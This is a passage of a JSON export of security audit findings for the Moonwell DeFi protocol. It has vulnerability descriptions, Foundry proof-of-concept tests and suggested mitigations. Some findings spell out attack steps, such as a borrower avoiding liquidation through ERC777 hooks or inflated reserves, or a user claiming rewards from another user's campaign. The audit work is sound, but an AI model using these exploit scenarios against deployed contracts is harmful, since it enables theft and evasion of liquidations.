treasury.setGSCAllowance(address(mockToken), 100 ether);          vm.startPrank(gscCoreVoting);         treasury.gscApprove(address(mockToken), address(4), 60 ether);         vm.expectRevert(stdError.arithmeticError);         treasury.gscApprove(address(mockToken), address(4), 50 ether);         vm.stopPrank();     } }  contract MockToken is ERC20 {     constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}      function mint(address account, uint256 amount) public {         _mint(account, amount);     } } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps When approve to a particular address, compare the new allowance with current allowance ([IERC20.allowance(...)](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/7222a31d548695998a475c9661fa159ef45a0e88/contracts/token/ERC20/IERC20.sol#L50)): 1. If the current allowance is equal to new allowance, do nothing; 2. If the current allowance is less than new allowance, `gscAllowance[token] -= (new allowance - current allowance)`; 3. IF the current allowance is larger than new allowance, `gscAllowance[token] += (current allowance - new allowance)`.    ## Assessed type  Access Control"}, {"title": "BORROWERS CAN AVOID LIQUIDATIONS, IF ERC777 TOKEN IS CONFIGURED AS AN `emissionToken` ", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/343", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "low quality report", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-07-moonwell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MErc20.sol#L139-L142 https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MToken.sol#L1002 https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MultiRewardDistributor/MultiRewardDistributor.sol#L1235-L1239   # Vulnerability details  ## Impact  If a borrower is `undercollateralized` then he can be liquidated by a liquidator by calling the `MErc20.liquidateBorrow` function. `liquidateBorrow` function calls the `MToken.liquidateBorrowFresh` in its execution process. Inside the `liquidateBorrowFresh` function the `MToken.repayBorrowFresh` is called which verifies whether repayment of borrowed amount is allowed by calling the `Comptroller.repayBorrowAllowed` function. The `repayBorrowAllowed` function updates the `borrower eligible rewards` by calling the `MultiRewardDistributor.updateMarketBorrowIndexAndDisburseBorrowerRewards`.  The `MultiRewardDistributor.updateMarketBorrowIndexAndDisburseBorrowerRewards` function calls the `disburseBorrowerRewardsInternal` to ditribute the multi rewards to the `borrower`. The `disburseBorrowerRewardsInternal` calls the `sendReward` function if the `_sendTokens` flag is set to `true`.  `sendReward` function is called for each `emissionConfig.config.emissionToken` token of the `MarketEmissionConfig[]` array of the given `_mToken` market.  `sendReward` function transafers the rewards to the `borrower` using the `safeTransfer` function as shown below:              token.safeTransfer(_user, _amount);  Problem here is that `emissionToken` can be `ERC777` token (which is backward compatible with ERC20) thus allowing a `malicious borrower` (the `recipient contract` of rewards in this case) to implement `tokensReceived` hook in its contract and revert the transaction inside the hook. This will revert the entire `liquidation` transaction. Hence the `undercollateralized borrower` can avoid the liquidation thus putting both depositors and protocol in danger.  ## Proof of Concept  ```solidity     function liquidateBorrow(address borrower, uint repayAmount, MTokenInterface mTokenCollateral) override external returns (uint) {         (uint err,) = liquidateBorrowInternal(borrower, repayAmount, mTokenCollateral);         return err;     } ```  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MErc20.sol#L139-L142  ```solidity         (uint repayBorrowError, uint actualRepayAmount) = repayBorrowFresh(liquidator, borrower, repayAmount); ```  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MToken.sol#L1002  ```solidity         if (_amount > 0 && _amount <= currentTokenHoldings) {             // Ensure we use SafeERC20 to revert even if the reward token isn't ERC20 compliant             token.safeTransfer(_user, _amount);             return 0;         } else { ```  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MultiRewardDistributor/MultiRewardDistributor.sol#L1235-L1239  ## Tools Used Manual Review and VSCode  ## Recommended Mitigation Steps Hence it is recommended to disallow any ERC777 tokens being configured as `emissionToken` in any `MToken` market and only allow ERC20 tokens as `emissionTokens`.   ## Assessed type  Other"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/328", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-14"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/immeas-Q.md)."}, {"title": "`excuteProposal` can fail due to Wormhole guardian change", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/325", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-07-moonwell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L346-L350   # Vulnerability details  ## Impact Wormhole governance can change signing guardian sets. If this happens between a proposal is queued and a proposal is executed. The second verification in `_executeProposal` will fail as the guardian set has changed between queuing and executing.  This would cause a proposal to fail to execute after the `proposalDelay` has passed. Causing a lengthy re-sending of the message from `Timelock` on source chain, then `proposalDelay` again.  ## Proof of Concept To execute a proposal on `TemporalGovernor` it first needs to be queued. When queued it is checked that the message is valid against the Wormhole bridge contract:  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L295-L306 ```solidity File: Governance/TemporalGovernor.sol  295:    function _queueProposal(bytes memory VAA) private { 296:        /// Checks 297: 298:        // This call accepts single VAAs and headless VAAs 299:        ( 300:            IWormhole.VM memory vm, 301:            bool valid, 302:            string memory reason 303:        ) = wormholeBridge.parseAndVerifyVM(VAA); 304: 305:        // Ensure VAA parsing verification succeeded. 306:        require(valid, reason); ```  After some more checks are done the message is [queued by its wormhole hash](https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L338-L339).  Then, after `proposalDelay`, anyone can call `executeProposal`  Before the proposal is executed though, a second check against the Wormhole bridge contract is done:  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L344-L350 ```solidity File: Governance/TemporalGovernor.sol  344:    function _executeProposal(bytes memory VAA, bool overrideDelay) private { 345:        // This call accepts single VAAs and headless VAAs 346:        ( 347:            IWormhole.VM memory vm, 348:            bool valid, 349:            string memory reason 350:        ) = wormholeBridge.parseAndVerifyVM(VAA); ```  The issue is that the second time the verification might fail.  During the wormhole contract check for validity there is a check that the correct guardian set has signed the message:  https://github.com/wormhole-foundation/wormhole/blob/f11299b888892d5b4abaa624737d0e5117d1bbb2/ethereum/contracts/Messages.sol#L79-L82 ```solidity 79:        /// @dev Checks if VM guardian set index matches the current index (unless the current set is expired). 80:        if(vm.guardianSetIndex != getCurrentGuardianSetIndex() && guardianSet.expirationTime < block.timestamp){ 81:            return (false, \"guardian set has expired\"); 82:        } ```  But(!), Wormhole governance can change the signers:  https://github.com/wormhole-foundation/wormhole/blob/f11299b888892d5b4abaa624737d0e5117d1bbb2/ethereum/contracts/Governance.sol#L76-L112 ```solidity  76:    /**  77:     * @dev Deploys a new `guardianSet` via Governance VAA/VM  78:     */  79:    function submitNewGuardianSet(bytes memory _vm) public {             // ... parsing and verification  104:        // Trigger a time-based expiry of current guardianSet 105:        expireGuardianSet(getCurrentGuardianSetIndex()); 106: 107:        // Add the new guardianSet to guardianSets 108:        storeGuardianSet(upgrade.newGuardianSet, upgrade.newGuardianSetIndex); 109: 110:        // Makes the new guardianSet effective 111:        updateGuardianSetIndex(upgrade.newGuardianSetIndex); 112:    } ```  Were this to happen between `queueProposal` and `executeProposal` the proposal would fail to execute.  ## Tools Used Manual audit  ## Recommended Mitigation Steps Consider only check the `VAA`s validity against Wormhole in `_executeProposal` when it is fasttracked (`overrideDelay==true`).  However then anyone can just just take the hash from the proposal `VAA` and submit whatever commands. One idea to prevent this is to instead of storing the `VAA` `vm.hash`, use the hash of the complete `VAA` as key in `queuedTransactions`. Thus, the content cannot be altered.  Or, the whole `VAA` can be stored alongside the timestamp and the `executeProposal` call can be made with just the hash.   ## Assessed type  Timing"}, {"title": "`emissionToken` cannot be reused", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/321", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-07-moonwell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MultiRewardDistributor/MultiRewardDistributor.sol#L418-L425   # Vulnerability details  ## Impact There can only be [one `emissionToken` per market](https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MultiRewardDistributor/MultiRewardDistributor.sol#L33). If two different users both want to do campaigns with the same token, even if at different times, they share the same \"pool\". This could either be misused by a user, to intentionally not fund the campaign stealing funds from the other. Or reward claims from one campaign spill over to the next one.  ## Proof of Concept Bob requests a campaign where they emit `USDC` for a market. They then never actually add any `USDC` but let the rewards accumulate.  Then, after Bobs \"campaign\" has ended, Alice also wants to do a campaign in `USDC`. She gets ownership of this configuration and configure their new endTime and speed. The issue is that Bobs previous accumulated rewards are still there and can drain Alice new campaign.  Test in `MultiRewardDistributor.t.sol`, `MultiRewardDistributorCommonUnitTest`: ```solidity     function testNewOwnerTakesOverEmissionToken() public {         uint256 startTime = 1678340000;         vm.warp(startTime);          // some setup from `createDistributorWithRoundValuesAndConfig`         MultiRewardDistributor distributor = new MultiRewardDistributor();         bytes memory initdata = abi.encodeWithSignature(\"initialize(address,address)\", address(comptroller), address(this));         TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(address(distributor), proxyAdmin, initdata);                  /// wire proxy up         distributor = MultiRewardDistributor(address(proxy));         comptroller._setRewardDistributor(distributor);                  distributor._addEmissionConfig(             mToken,             address(this),             address(emissionToken),             0.1e18,             0,             block.timestamp + 10         );          faucetToken.allocateTo(address(this), 1e18);         faucetToken.approve(address(mToken), 1e18);          // user mints but no tokens added in emissions         mToken.mint(1e18);         assertEq(MTokenInterface(mToken).totalSupply(), 1e18);          // time passes         vm.warp(block.timestamp + 20);          // initial user withdraws         mToken.redeem(1e18);          // another user uses same token for a new campaign         address alice = address(0x1111);         distributor._updateOwner(mToken,address(emissionToken),alice);          vm.prank(alice);         distributor._updateEndTime(mToken,address(emissionToken),block.timestamp + 10);                  emissionToken.allocateTo(address(distributor), 1e18);                  vm.warp(block.timestamp + 1 days);          // original user can claim second campaigns funds without having participated         comptroller.claimReward();         assertEq(emissionToken.balanceOf(address(this)), 1e18);     } ```  This PoC is a bit handwavey but it shows that the emission \"pool\" is shared across all users of that token. Hence, in practice, an `emissionToken` cannot be reused. As soon as someone uses `USDC` or `WETH` as a reward token, they can never be used again in the same market.  ## Tools Used Manual audit  ## Recommended Mitigation Steps Consider adding an ability to remove an `emissionConfig`. Or add more bookkeeping which owner adds which funds and can only extract rewards for their own funds.   ## Assessed type  Other"}, {"title": "only `guardian` can change `guardian`", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/315", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-07-moonwell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L27 https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol#L81-L86   # Vulnerability details  ## Impact `guardian` is mentioned as an area of concern in the [docs](https://github.com/code-423n4/2023-07-moonwell#overview): > Specific areas of concern include: > ... > * TemporalGovernor which is the cross chain governance contract. Specific areas of concern include delays, **the pause guardian**, ...  `guardian` is a roll that has the ability to pause and unpause `TemporalGovernor`. In code, it uses the `owner` from OpenZeppelin `Ownable` as `guardian`. The issue is that [`Ownable::transferOwnership`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol#L81-L86) is not overridden. Only `guardian` (`owner`) can transfer the role.  This can be a conflict of interest if there is a falling out between governance and the guardian. If the `guardian` doesn't want to abstain, governance only option would be to call [`revokeGuardian`](https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L205-L221) which sets `owner` to `address(0)`. This permanently removes the ability to pause the contract which can be undesirable.  ## Proof of Concept Simple test in  `TemporalGovernorExec.t.sol`: ```solidity     function testGovernanceCannotTransferGuardian() public {         address[] memory targets = new address[](1);         targets[0] = address(governor);         uint256[] memory values = new uint256[](1);                  bytes[] memory payloads = new bytes[](1);         payloads[0] = abi.encodeWithSelector(Ownable.transferOwnership.selector,address(newAdmin));          bytes memory payload = abi.encode(address(governor), targets, values, payloads);         mockCore.setStorage(true, trustedChainid, governor.addressToBytes(admin), \"reeeeeee\", payload);          governor.queueProposal(\"\");          vm.warp(block.timestamp + proposalDelay);          // governance cannot transfer guardian         vm.expectRevert(abi.encodeWithSignature(\"Error(string)\", \"Ownable: caller is not the owner\"));         governor.executeProposal(\"\");     } ```  ## Tools Used Manual audit  ## Recommended Mitigation Steps Consider overriding `transferOwnership` and either limit it to only governance (`msg.sender == address(this)`) or both `guardian` and governance.   ## Assessed type  Governance"}, {"title": "`TemporalGovernor` can be bricked by `guardian`", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/314", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-07-moonwell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L27 https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L188-L198 https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L256   # Vulnerability details  ## Description When a `guardian` pauses `TemporalGovernor` they [lose the ability to pause again](https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L283). This can then be reinstated by governance using [`grantGuardiansPause`](https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L188-L198).  However `grantGuardiansPause` can be called when the contract is still paused. This would break the assertions in [`permissionlessUnpause`]((https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L256)) and [`togglePause`](https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L289): `assert(!guardianPauseAllowed)`.  Also, `TemporalGovernor` [inherits from OpenZeppelin `Ownable`](https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L27). There the `owner` has the ability to [`renounceOwnership`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol#L73-L75).  This could cause `TemporalGovernor` to end up in a bad state, since [`revokeGuardian`](https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L205-L221) call that has special logic for revoking the guardian.  There is the ability to combine these two issues to brick the contract:  1. `guardian` pauses the contract. 2. governance sends an instruction for `grantGuardiansPause` which the `guardian` executes (while still paused). This step disables both `permissionlessUnpause` and `togglePause`. Though the contract is still rescuable through `revokeGuardian`. 3. `guardian` calls `renounceOwnership` from `Ownable`. Which disables any possibility to execute commands on `TemporalGovernor`. Hence no more ability to call `revokeGuardian`.  ## Impact The contract is bricked. Since `permissionlessUnpause` can't be called due to the `assert(!guardianPauseAllowed)`. No cross chain calls an be processed because `executeProposal` is `whenNotPaused` and there is no `guardian` to execute `fastTrackProposalExecution`. Thus the `TemporalGovernor` will be stuck in paused state.  It is also possible for the `guardian` to hold the contract hostage before step 3 (`renounceOwnership`) as they are the only ones who can execute calls on it (through `fastTrackProposalExecution`).  This is scenario relies on governance sending a cross chain `grantGuardiansPause` while the contract is still paused and a malicious `guardian` which together are unlikely. Though the [docs](https://github.com/code-423n4/2023-07-moonwell#overview) mention this as a concern:  > Specific areas of concern include: > ... > * TemporalGovernor which is the cross chain governance contract. Specific areas of concern include delays, **the pause guardian**, **putting the contract into a state where it cannot be updated.**  ## Proof of Concept Test in `TemporalGovernorExec.t.sol`: ```solidity     function testBrickTemporalGovernor() public {         // 1. guardian pauses contract         governor.togglePause();         assertTrue(governor.paused());         assertFalse(governor.guardianPauseAllowed());          // 2. grantGuardianPause is called         address[] memory targets = new address[](1);         targets[0] = address(governor);         uint256[] memory values = new uint256[](1);                  bytes[] memory payloads = new bytes[](1);         payloads[0] = abi.encodeWithSelector(TemporalGovernor.grantGuardiansPause.selector);          bytes memory payload = abi.encode(address(governor), targets, values, payloads);         mockCore.setStorage(true, trustedChainid, governor.addressToBytes(admin), \"reeeeeee\", payload);          governor.fastTrackProposalExecution(\"\");         assertTrue(governor.guardianPauseAllowed());          // 3. guardian revokesOwnership         governor.renounceOwnership();          // TemporalGovernor is bricked          // contract is paused so no proposals can be sent         vm.expectRevert(\"Pausable: paused\");         governor.executeProposal(\"\");          // guardian renounced so no fast track execution or togglePause         assertEq(address(0),governor.owner());          // permissionlessUnpause impossible because of assert         vm.warp(block.timestamp + permissionlessUnpauseTime + 1);         vm.expectRevert();         governor.permissionlessUnpause();     } ```  ## Tools Used Manual audit  ## Recommended Mitigation Steps However unlikely this is to happen, there are some simple steps that can be taken to prevent if from being possible:  Consider adding `whenNotPaused` to `grantGuardiansPause` to prevent mistakes (or possible abuse). And also overriding the calls `renounceOwnership` and `transferOwnership`. `transferOwnership` should be a governance call (`msg.sender == address(this)`) to move the `guardian` to a new trusted account.  Perhaps also consider if the `assert(!guardianPauseAllowed)` is worth just for pleasing the SMT solver.   ## Assessed type  DoS"}, {"title": "`fastTrackProposalExecution` doesn't check `intendedRecipient`", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/308", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-07-moonwell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L261-L268   # Vulnerability details  ## Description Wormhole cross chain communication [is multicasted](https://docs.wormhole.com/wormhole/explore-wormhole/core-contracts#multicast) to all their supported chains:  > Please notice that there is no destination address or chain in these functions. > VAAs simply attest that \"this contract on this chain said this thing.\" Therefore, VAAs are multicast by default and will be verified as authentic on any chain they are brought to.  The `TermporalGovernor` contract handles this by checking `queueProposal` that the `intendedRecipient` is itself:  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L320-L322 ```solidity File: core/Governance/TemporalGovernor.sol  320:        // Very important to check to make sure that the VAA we're processing is specifically designed 321:        // to be sent to this contract 322:        require(intendedRecipient == address(this), \"TemporalGovernor: Incorrect destination\"); ```  There is also a `fastTrackProposalExecution` that the guardian can perform (`owner` is referred ot as `guardian`):  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L261-L268 ```solidity File: core/Governance/TemporalGovernor.sol  261:    /// @notice Allow the guardian to process a VAA when the 262:    /// Temporal Governor is paused this is only for use during 263:    /// periods of emergency when the governance on moonbeam is 264:    /// compromised and we need to stop additional proposals from going through. 265:    /// @param VAA The signed Verified Action Approval to process 266:    function fastTrackProposalExecution(bytes memory VAA) external onlyOwner { 267:        _executeProposal(VAA, true); /// override timestamp checks and execute 268:    } ```  This will bypass the `queueProposal` flow and execute commands immediately.  The issue here is that there is no check in `_executeProposal` that the `intendedRecipient` is this `TemporalGovernor`.  ## Impact `governor` can execute any commands communicated across `Wormhole` as long as they are from a trusted source.  This requires that the `targets` line up between chains for a `governor` to abuse this. However only one `target` must line up as the `.call` made [does not check for contract existence](https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Governance/TemporalGovernor.sol#L395-L402). Since \"unaligned\" addresses between chains will most likely not exist on other chains these calls will succeeed.  ## Proof of Concept Test in `TemporalGovernorExec.t.sol`, all of the test is copied from `testProposeFailsIncorrectDestination` with just the change at the end where instead of calling `queueProposal`, `fastTrackProposalExecution` is called instead, which doesn't revert, thus highligting the issue.  ```solidity     function testFasttrackExecuteSucceedsIncorrectDestination() public {         address[] memory targets = new address[](1);         targets[0] = address(governor);          uint256[] memory values = new uint256[](1);         values[0] = 0;          TemporalGovernor.TrustedSender[]             memory trustedSenders = new TemporalGovernor.TrustedSender[](1);          trustedSenders[0] = ITemporalGovernor.TrustedSender({             chainId: trustedChainid,             addr: newAdmin         });          bytes[] memory payloads = new bytes[](1);          payloads[0] = abi.encodeWithSignature( /// if issues use encode with selector             \"setTrustedSenders((uint16,address)[])\",             trustedSenders         );          /// wrong intendedRecipient         bytes memory payload = abi.encode(newAdmin, targets, values, payloads);          mockCore.setStorage(             true,             trustedChainid,             governor.addressToBytes(admin),             \"reeeeeee\",             payload         );          // guardian can fast track execute calls intended for other contracts         governor.fastTrackProposalExecution(\"\");     } ```  ## Tools Used Manual audit  ## Recommended Mitigation Steps Consider adding a check in `_executeProposal` for `intendedRecipient` same as is done in `_queueProposal`.   ## Assessed type  Invalid Validation"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/273", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-21"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/hals-Q.md)."}, {"title": "Proposals which intend to send native tokens to target addresses can't be executed", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/268", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-09"], "target": "2023-07-moonwell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-moonwell/blob/fced18035107a345c31c9a9497d0da09105df4df/src/core/Governance/TemporalGovernor.sol#L237-L239 https://github.com/code-423n4/2023-07-moonwell/blob/fced18035107a345c31c9a9497d0da09105df4df/src/core/Governance/TemporalGovernor.sol#L400-L402   # Vulnerability details  ## Impact  - In `TemporalGovernor` contract: any verified action approval (VAA)/proposal can be executed by anyone if it has been queued and passed the time delay. - But if the proposal is intended to send native tokens to the target address; it will revert since `TemporalGovernor` contract doesn't have any balance, as there's no `receive()` or payable functions to receive the funds that will be sent to the proposal's target address. - So any proposal with a value (decoded from `vm.payload`) will not be executed since the     `target.call{value:value}(data)` will revert.  ## Proof of Concept  - Code:   [Line 237-239](https://github.com/code-423n4/2023-07-moonwell/blob/fced18035107a345c31c9a9497d0da09105df4df/src/core/Governance/TemporalGovernor.sol#L237-L239)  ```solidity File: src/core/Governance/TemporalGovernor.sol Line 237-239:     function executeProposal(bytes memory VAA) public whenNotPaused {         _executeProposal(VAA, false);     } ```  [Line 400-402](https://github.com/code-423n4/2023-07-moonwell/blob/fced18035107a345c31c9a9497d0da09105df4df/src/core/Governance/TemporalGovernor.sol#L400-L402)  ```solidity File: src/core/Governance/TemporalGovernor.sol Line 400-402:         (bool success, bytes memory returnData) = target.call{value: value}(             data         ); ```  - Foundry PoC:  1. This test is copied from `testExecuteSucceeds` test in `TemporalGovernorExec.t.sol` file,and modified to demonstrate the issue; where a proposal is set to send an EOA receiverAddress a value of 1 ether, but will revert due to lack of funds (follow the comments in the test):  ```solidity  function testProposalWithValueExecutionFails() public {         address receiverAddress = address(0x2);         address[] memory targets = new address[](1);         targets[0] = address(receiverAddress);          uint256[] memory values = new uint256[](1);         values[0] = 1 ether; // the proposal has a value of 1 eth to send it to the receiverAddress          bytes[] memory payloads = new bytes[](1);          payloads[0] = abi.encodeWithSignature(\"\");          /// to be unbundled by the temporal governor         bytes memory payload = abi.encode(             address(governor),             targets,             values,             payloads         );          mockCore.setStorage(             true,             trustedChainid,             governor.addressToBytes(admin),             \"reeeeeee\",             payload         );         governor.queueProposal(\"\");          bytes32 hash = keccak256(abi.encodePacked(\"\"));         (bool executed, uint248 queueTime) = governor.queuedTransactions(hash);          assertEq(queueTime, block.timestamp);         assertFalse(executed);         //---executing the reposal         vm.warp(block.timestamp + proposalDelay);          //check that the balance of receiverAddress is zero before execution:         assertEq(receiverAddress.balance, 0);          // executeProposal function will revert due to lack of funds:         vm.expectRevert();         governor.executeProposal(\"\");         assertFalse(executed); // the proposal wasn't executed         assertEq(receiverAddress.balance, 0); // the receiverAddress hasn't received any funds because the proposal execution has reverted due to lack of funds     } ```  2. Test result:  ```bash $ forge test --match-test testProposalWithValueExecutionFails -vvv Running 1 test for test/unit/TemporalGovernor/TemporalGovernorExec.t.sol:TemporalGovernorExecutionUnitTest [PASS] testProposalWithValueExecutionFails() (gas: 458086) Test result: ok. 1 passed; 0 failed; finished in 2.05ms ```  ## Tools Used  Manual Testing & Foundry.  ## Recommended Mitigation Steps  Add `receive()` function to the `TemporalGovernor` contract; so that it can receive funds (native tokens) to be sent with proposals.   ## Assessed type  ETH-Transfer"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/258", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-22"], "target": "2023-07-moonwell-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-moonwell-findings/blob/main/data/twcctop-Q.md)."}, {"title": "User can prevent liquidation by enter another market that have low supply and borrow activity", "html_url": "https://github.com/code-423n4/2023-07-moonwell-findings/issues/239", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-10"], "target": "2023-07-moonwell-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MToken.sol#L1263-L1273 https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MToken.sol#L358 https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MToken.sol#L402   # Vulnerability details  ## Impact Users can prevent themselves from being liquidated by entering another market that has low supply/borrow activity or have low/volatile value compared to other markets, the detailed scenario will be explained in PoC.  ## Proof of Concept  The scenario : - Alice enter market A, supply and borrow in that market. - Alice enter market B that have low supply and borrow or low value compared to market A. - Alice call `_addReserves` in market B so that `totalReserves` is bigger than `totalCash` + `totalBorrows`. - After some time Alice has shortfall (his borrow value bigger than supply value). - Another user try to liquidate Alice and seize her market A collateral by calling `liquidateBorrow` :  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MErc20.sol#L139-L142  ```solidity     function liquidateBorrow(address borrower, uint repayAmount, MTokenInterface mTokenCollateral) override external returns (uint) {         (uint err,) = liquidateBorrowInternal(borrower, repayAmount, mTokenCollateral);         return err;     } ```  It will eventually trigger comptroller's `liquidateBorrowAllowed` hook :  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MToken.sol#L970  ```solidity     function liquidateBorrowFresh(address liquidator, address borrower, uint repayAmount, MTokenInterface mTokenCollateral) internal returns (uint, uint) {         /* Fail if liquidate not allowed */         uint allowed = comptroller.liquidateBorrowAllowed(address(this), address(mTokenCollateral), liquidator, borrower, repayAmount);         if (allowed != 0) {             return (failOpaque(Error.COMPTROLLER_REJECTION, FailureInfo.LIQUIDATE_COMPTROLLER_REJECTION, allowed), 0);         } ... } ```  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Comptroller.sol#L394-L424  Inside `liquidateBorrowAllowed` hook, it will eventually call `getHypotheticalAccountLiquidityInternal` that will loop trough Alice entered markets/assets and call `getAccountSnapshot` to get token balance, borrow, and exchangeRate :   https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/Comptroller.sol#L578  ```solidity     function getHypotheticalAccountLiquidityInternal(         address account,         MToken mTokenModify,         uint redeemTokens,         uint borrowAmount) internal view returns (Error, uint, uint) {          AccountLiquidityLocalVars memory vars; // Holds all our calculation results         uint oErr;          // For each asset the account is in         MToken[] memory assets = accountAssets[account];         for (uint i = 0; i < assets.length; i++) {             MToken asset = assets[i];              // Read the balances and exchange rate from the mToken             (oErr, vars.mTokenBalance, vars.borrowBalance, vars.exchangeRateMantissa) = asset.getAccountSnapshot(account);             if (oErr != 0) { // semi-opaque error code, we assume NO_ERROR == 0 is invariant between upgrades                 return (Error.SNAPSHOT_ERROR, 0, 0);             } ... } ```  But `getAccountSnapshot` will result in error when try to calculate `exchangeRateStoredInternal` because `totalReserves` bigger than `totalCash` + `totalBorrows`.  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MToken.sol#L357-L361   ```     function exchangeRateStoredInternal() virtual internal view returns (MathError, uint) {         uint _totalSupply = totalSupply;         if (_totalSupply == 0) {             /*              * If there are no tokens minted:              *  exchangeRate = initialExchangeRate              */             return (MathError.NO_ERROR, initialExchangeRateMantissa);         } else {             /*              * Otherwise:              *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply              */             uint totalCash = getCashPrior();             uint cashPlusBorrowsMinusReserves;             Exp memory exchangeRate;             MathError mathErr;             // @audit - this will revert if totalReservers > totalBorrow + totalCash             (mathErr, cashPlusBorrowsMinusReserves) = addThenSubUInt(totalCash, totalBorrows, totalReserves);             if (mathErr != MathError.NO_ERROR) {                 return (mathErr, 0);             }              (mathErr, exchangeRate) = getExp(cashPlusBorrowsMinusReserves, _totalSupply);             if (mathErr != MathError.NO_ERROR) {                 return (mathErr, 0);             }              return (MathError.NO_ERROR, exchangeRate.mantissa);         }     } ```  Also this scenario will prevent `_reduceReserves` because when try to `accrueInterest`, it will also fail due to the same condition (`totalReserves` bigger than `totalCash` + `totalBorrows`) .  https://github.com/code-423n4/2023-07-moonwell/blob/main/src/core/MToken.sol#L402  Now Alice can't be liquidated.  this scenario is profitable when market B has lower token value compared to market A and has low supply/borrow activity, (shortfall of Alice on market A has bigger value than the donated reserves value to market B).   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Consider to restrict add reserves function, or actively monitor and remove market of token that have low/volatile value or low borrow and supply activity.         ## Assessed type  Other"}, {"title": "QA Report", "html_url": 